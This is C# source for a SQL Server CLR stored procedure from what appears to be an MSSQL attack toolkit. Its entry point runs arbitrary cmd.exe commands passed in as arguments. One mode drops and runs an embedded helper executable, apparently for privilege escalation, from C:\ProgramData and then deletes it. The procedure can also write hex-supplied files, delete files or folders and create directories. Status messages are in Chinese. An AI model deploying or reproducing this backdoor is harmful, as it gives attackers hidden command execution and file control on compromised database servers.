﻿using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.IO;
using System.Text;
using MDATKit;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void kitmain(string method, string arguments)
    {
        if ("cmdexec".Equals(method.ToLower()))
        {
            log(RunCommand("cmd.exe", "/c " + arguments));
        }
        else if ("supercmdexec".Equals(method.ToLower()))
        {
            try
            {
                if (!File.Exists("C:\\ProgramData\\sp.exe"))
                {
                    var createKumpir = new CreateKumpir();
                    createKumpir.KumpirBytes();
                }
                arguments = arguments.Replace("\"", "\"\"");
                log(RunCommand("cmd.exe", "/c C:\\ProgramData\\sp.exe -a \"" + arguments + "\""));
            }
            catch (Exception e)
            {
                log(e.Message);
            }
            finally
            {
                File.Delete("C:\\ProgramData\\sp.exe");
            }
        }
        else if ("writefile".Equals(method.ToLower()))
        {
            string path = arguments.Substring(0, arguments.IndexOf("^"));//路径
            string contents = arguments.Substring(arguments.IndexOf("^") + 1);//内容
            writefile(path, contents);

        }
        else if ("delete".Equals(method.ToLower()))
        {
            deletefileordir(arguments);
        }
        else if ("newdir".Equals(method.ToLower()))
        {
            newDirectory(arguments);
        }

    }
    public static string RunCommand(string filename, string arguments)
    {
        var process = new Process();

        process.StartInfo.FileName = filename;
        if (!string.IsNullOrEmpty(arguments))
        {
            process.StartInfo.Arguments = arguments;
        }

        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.UseShellExecute = false;

        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.RedirectStandardOutput = true;
        var stdOutput = new StringBuilder();
        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);
        string stdError = null;
        try
        {
            process.Start();
            process.BeginOutputReadLine();
            stdError = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }
        catch (Exception e)
        {
            SqlContext.Pipe.Send("OS error while executing " + filename + arguments + ": " + e.Message);
        }
        return stdOutput.ToString();
    }


    public static void writefile(string filename, string conntents)
    {
        try
        {
            File.WriteAllBytes(filename, CreateKumpir.ConvertToByteArray("0x" + conntents));
            log("上传成功！");
        }
        catch (Exception e)
        {
            log(e.Message);
        }
    }
    public static void deletefileordir(string path)
    {
        if (Directory.Exists(path))
        {
            Directory.Delete(path, true);
            log("删除文件夹成功！");

        }
        else
        {
            File.Delete(path);
            log("删除文件成功！");
        }
    }

    public static void newDirectory(string path)
    {
        if (Directory.Exists(path))
        {
            log("文件夹已存在！");
        }
        else
        {
            Directory.CreateDirectory(path);
            log("创建文件夹成功！");
        }

    }

    public static void log(string info)
    {
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData[] {
                new SqlMetaData("output", SqlDbType.NVarChar, 4000)
        });
        // Mark the beginning of the result set.z
        SqlContext.Pipe.SendResultsStart(record);

        // Set values for each column in the row
        record.SetString(0, info.ToString());

        // Send the row back to the client.
        SqlContext.Pipe.SendResultsRow(record);

        // Mark the end of the result set.
        SqlContext.Pipe.SendResultsEnd();
    }

}
